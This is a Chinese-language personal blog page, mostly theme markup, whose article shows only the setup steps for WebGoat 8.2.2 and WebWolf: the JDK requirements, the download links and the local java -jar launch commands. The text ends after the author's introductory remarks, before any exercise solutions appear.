<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><div id="myscoll"></div><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>CTF之WebGoat学习记录 | NoneVector</title><meta name="keywords" content="WebGoat"><meta name="author" content="NoneVector,2339115702@qq.com"><meta name="copyright" content="NoneVector"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="WebGoat8.22之Write up">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF之WebGoat学习记录">
<meta property="og:url" content="https://nonevector.top/posts/19.html">
<meta property="og:site_name" content="NoneVector">
<meta property="og:description" content="WebGoat8.22之Write up">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://git.acwing.com/w2x/data_bank/-/raw/master/anmi/Pixiv/45136636_p0.jpg">
<meta property="article:published_time" content="2023-12-10T10:25:17.643Z">
<meta property="article:modified_time" content="2024-01-07T06:08:54.585Z">
<meta property="article:author" content="NoneVector">
<meta property="article:tag" content="WebGoat">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://git.acwing.com/w2x/data_bank/-/raw/master/anmi/Pixiv/45136636_p0.jpg"><link rel="shortcut icon" href="/assets/favicon.ico"><link rel="canonical" href="https://nonevector.top/posts/19"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/font-awesome/6.0.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.staticfile.org/fancyapps-ui/4.0.31/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdnjs.cloudflare.com/ajax/libs/flickr-justified-gallery/2.1.2/fjGallery.min.js',
      css: 'https://cdnjs.cloudflare.com/ajax/libs/flickr-justified-gallery/2.1.2/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CTF之WebGoat学习记录',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-01-07 14:08:54'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="https://npm.elemecdn.com/ethan4116-blog/lib/css/plane_v2.css"><script src="https://npm.elemecdn.com/echarts@4.9.0/dist/echarts.min.js"></script><script src="https://npm.elemecdn.com/echarts@4.9.0/map/js/china.js"></script><link rel="stylesheet" href="https://cdn1.tianli0.top/npm/element-ui@2.15.6/packages/theme-chalk/lib/index.css"><style id="themeColor"></style><style id="rightSide"></style><style id="transPercent"></style><style id="blurNum"></style><style id="settingStyle"></style><span id="fps"></span><style id="defineBg"></style><style id="menu_shadow"></style><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://unpkg.zhimg.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="NoneVector" type="application/atom+xml">
</head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/assets/1.jpg" onerror="onerror=null;src='/assets/r1.jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-shouye"></use></svg><span class="menu_word" style="font-size:17px"> 首页</span></a></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-wenzhang"></use></svg><span class="menu_word" style="font-size:17px"> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-guidang">                   </use></svg><span class="menu_word" style="font-size:17px"> 归档</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-biaoqian">                   </use></svg><span class="menu_word" style="font-size:17px"> 标签</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-fenlei">                   </use></svg><span class="menu_word" style="font-size:17px"> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-xiuxian"></use></svg><span class="menu_word" style="font-size:17px"> 休闲</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/life/music/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-yinlehe">                   </use></svg><span class="menu_word" style="font-size:17px"> 音乐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/life/games/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-youxishoubing">                   </use></svg><span class="menu_word" style="font-size:17px"> 游戏</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-xiangzi"></use></svg><span class="menu_word" style="font-size:17px"> 八宝箱</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/box/gallery/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-gallery">                   </use></svg><span class="menu_word" style="font-size:17px"> 画廊</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/box/animation/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-maozi">                   </use></svg><span class="menu_word" style="font-size:17px"> 动画</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/box/nav/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-zhifengche">                   </use></svg><span class="menu_word" style="font-size:17px"> 网址导航</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-jiaoliu1"></use></svg><span class="menu_word" style="font-size:17px"> 社交</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-liuyanban">                   </use></svg><span class="menu_word" style="font-size:17px"> 留言板</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/social/link/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-icon-test">                   </use></svg><span class="menu_word" style="font-size:17px"> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-WEBSITE"></use></svg><span class="menu_word" style="font-size:17px"> 网站</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/site/census/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon--tongjibiao">                   </use></svg><span class="menu_word" style="font-size:17px"> 网站统计</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/site/charts/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-tubiao_moban-68">                   </use></svg><span class="menu_word" style="font-size:17px"> 文章统计</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/site/time/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-shijian">                   </use></svg><span class="menu_word" style="font-size:17px"> 旧时光</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-PersonalDataProtection"></use></svg><span class="menu_word" style="font-size:17px"> 个人</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/personal/bb/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-jiaoliu">                   </use></svg><span class="menu_word" style="font-size:17px"> 唠叨</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/personal/about/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-zhifeiji">                   </use></svg><span class="menu_word" style="font-size:17px"> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">NoneVector</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-shouye"></use></svg><span class="menu_word" style="font-size:17px"> 首页</span></a></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-wenzhang"></use></svg><span class="menu_word" style="font-size:17px"> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-guidang">                   </use></svg><span class="menu_word" style="font-size:17px"> 归档</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-biaoqian">                   </use></svg><span class="menu_word" style="font-size:17px"> 标签</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-fenlei">                   </use></svg><span class="menu_word" style="font-size:17px"> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-xiuxian"></use></svg><span class="menu_word" style="font-size:17px"> 休闲</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/life/music/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-yinlehe">                   </use></svg><span class="menu_word" style="font-size:17px"> 音乐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/life/games/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-youxishoubing">                   </use></svg><span class="menu_word" style="font-size:17px"> 游戏</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-xiangzi"></use></svg><span class="menu_word" style="font-size:17px"> 八宝箱</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/box/gallery/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-gallery">                   </use></svg><span class="menu_word" style="font-size:17px"> 画廊</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/box/animation/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-maozi">                   </use></svg><span class="menu_word" style="font-size:17px"> 动画</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/box/nav/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-zhifengche">                   </use></svg><span class="menu_word" style="font-size:17px"> 网址导航</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-jiaoliu1"></use></svg><span class="menu_word" style="font-size:17px"> 社交</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-liuyanban">                   </use></svg><span class="menu_word" style="font-size:17px"> 留言板</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/social/link/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-icon-test">                   </use></svg><span class="menu_word" style="font-size:17px"> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-WEBSITE"></use></svg><span class="menu_word" style="font-size:17px"> 网站</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/site/census/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon--tongjibiao">                   </use></svg><span class="menu_word" style="font-size:17px"> 网站统计</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/site/charts/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-tubiao_moban-68">                   </use></svg><span class="menu_word" style="font-size:17px"> 文章统计</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/site/time/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-shijian">                   </use></svg><span class="menu_word" style="font-size:17px"> 旧时光</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-PersonalDataProtection"></use></svg><span class="menu_word" style="font-size:17px"> 个人</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/personal/bb/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-jiaoliu">                   </use></svg><span class="menu_word" style="font-size:17px"> 唠叨</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/personal/about/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-zhifeiji">                   </use></svg><span class="menu_word" style="font-size:17px"> 关于</span></a></li></ul></div></div><center id="name-container"><a id="page-name" href="javascript:scrollToTop()">PAGE_NAME</a></center><div id="nav-right"><div id="search-button"><a class="search faa-parent animated-hover" title="检索站内任何你想要的信息"><svg class="faa-tada icon" style="height:24px;width:24px;fill:currentColor;position:relative;top:6px" aria-hidden="true"><use xlink:href="#icon-sousuo"></use></svg><span> 搜索</span></a></div><a class="meihua faa-parent animated-hover" onclick="toggleWinbox()" title="美化设置-自定义你的风格" id="meihua-button"><svg class="faa-tada icon" style="height:26px;width:26px;fill:currentColor;position:relative;top:8px" aria-hidden="true"><use xlink:href="#icon-shezhi"></use></svg></a><a class="sun_moon faa-parent animated-hover" onclick="switchNightMode()" title="浅色和深色模式转换" id="nightmode-button"><svg class="faa-tada" style="height:25px;width:25px;fill:currentColor;position:relative;top:7px" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-yueliang">       </use></svg></a><div id="toggle-menu"><a><i class="fas fa-bars fa-fw"></i></a></div></div></div></nav><div id="post-info"><h1 class="post-title">CTF之WebGoat学习记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><svg class="meta_icon post-meta-icon" style="width:30px;height:30px;position:relative;top:10px"><use xlink:href="#icon-rili"></use></svg><span class="post-meta-label">发表于 </span><time class="post-meta-date-created" datetime="2023-12-10T10:25:17.643Z" title="发表于 2023-12-10 18:25:17">2023-12-10</time><span class="post-meta-separator">|</span><svg class="meta_icon post-meta-icon" style="width:18px;height:18px;position:relative;top:5px"><use xlink:href="#icon-gengxin1"></use></svg><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-07T06:08:54.585Z" title="更新于 2024-01-07 14:08:54">2024-01-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><svg class="meta_icon post-meta-icon" style="width:18px;height:18px;position:relative;top:5px"><use xlink:href="#icon-biaoqian"></use></svg><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><svg class="meta_icon post-meta-icon" style="width:25px;height:25px;position:relative;top:8px"><use xlink:href="#icon-charuword"></use></svg><span class="post-meta-label">字数总计:</span><span class="word-count">2.9w</span><span class="post-meta-separator">|</span><svg class="meta_icon post-meta-icon" style="width:20px;height:20px;position:relative;top:5px"><use xlink:href="#icon-shizhong"></use></svg><span class="post-meta-label">阅读时长:</span><span>110分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CTF之WebGoat学习记录"><svg class="meta_icon post-meta-icon" style="width:25px;height:25px;position:relative;top:5px"><use xlink:href="#icon-eye"></use></svg><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="安装-环境配置">安装+环境配置</h2>
<blockquote>
<p>不通版本有些地方不一样，因此最好找一样的版本</p>
</blockquote>
<p>先要安装jdk、Webgoat和Webwolf</p>
<p>Webgoat和Webwolf jdk1.8不支持了，需要安装jdk11</p>
<p>去git上下载Webgoat和Webwolf（只需要webgoat-server-xxx.jar 和 webwolf-xxx.jar就行了，下载后记得放同一个文件夹下，最好路径没中文，虽然有中文也能启动，但是养好习惯）</p>
<p><a target="_blank" rel="noopener" href="https://github.com/WebGoat/WebGoat/releases">链接直达</a></p>
<p>自行选择版本，我选择的是<strong>8.2.2</strong></p>
<p>去<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=oracle&amp;spm=1001.2101.3001.7020">oracle</a>官网下载（注意版本问题，版本不匹配会报错，8.2.2需要jdk&gt;15)下面是jdk17，然后记得配置环境变量</p>
<p><a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html">链接直达</a></p>
<p>启动命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java –jar webgoat-server-8.2.2.jar --server.port=8080 # 启动webgoat这里开放端口是8080，根据自己需求自己改</span><br><span class="line">java -jar -Dfile.encoding=UTF-8 webwolf-8.2.2.jar --server.port=9090 # 启动webwolf这里开放端口是9090，根据自己需求自己改</span><br></pre></td></tr></table></figure>
<p>启动后进入浏览器输入(注意大小。。。)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">localhost:8080/WebGoat/</span><br><span class="line">localhost:9090/WebWolf/</span><br></pre></td></tr></table></figure>
<p>WebGoat会自动跳转到login，自行注册就行了，WebWolf用的是WebGoat的账号密码</p>
<blockquote>
<p>因为题目全是英格力士，我是用edge浏览器自带翻译功能</p>
<p>因为博主有刷其他靶场的经验，本靶场仅仅作为博主的笔记</p>
<p>因此大部分只有答案过程可能并不详细，并且只在需要才会给出步骤图片（懒）</p>
